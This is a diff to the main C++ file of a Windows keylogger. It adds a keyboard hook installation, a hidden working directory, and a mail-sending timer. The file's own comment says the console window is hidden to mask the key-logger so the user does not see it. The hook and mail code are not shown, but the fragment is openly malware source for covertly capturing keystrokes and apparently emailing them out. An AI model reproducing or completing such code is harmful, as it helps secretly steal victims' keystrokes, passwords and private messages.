@@ -5,11 +5,16 @@
 #include "Base64.h"
 #include "IO.h"
 #include "Timer.h"
+#include "SendMail.h"
+#include "KeybHook.h"
 using namespace std;
 
 int main()
 {
     MSG Msg;
+    IO::MKDir(IO::GetOurPath(true));
+
+    InstallHook();
 
     /** Removing Console Window from Screen **/
     /** It is basically masking the key-logger so user does not see it **/
@@ -18,5 +23,8 @@ int main()
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
+
+    MailTimer.Stop();
+
     return 0;
 }
